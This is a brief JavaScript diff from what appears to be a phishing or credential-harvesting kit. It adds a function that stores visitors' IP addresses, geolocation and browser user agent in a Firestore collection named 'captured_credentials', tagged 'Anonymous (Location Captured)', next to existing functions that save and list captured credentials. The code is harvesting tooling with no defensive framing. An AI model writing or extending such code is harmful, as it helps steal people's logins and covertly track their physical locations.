@@ -73,6 +73,18 @@ export async function saveCredentials(data) {
     });
 }
 
+export async function saveLocationOnly(data) {
+    return await addDoc(collection(db, 'captured_credentials'), {
+        username: 'Anonim (Konum Yakalandı)',
+        password: '---',
+        ip: data.ip || 'Unknown',
+        location: data.location, // { lat, lng, strategy }
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+        isLocationOnly: true
+    });
+}
+
 export async function getAllCredentials() {
     const q = query(collection(db, 'captured_credentials'), orderBy('timestamp', 'desc'));
     const snapshot = await getDocs(q);
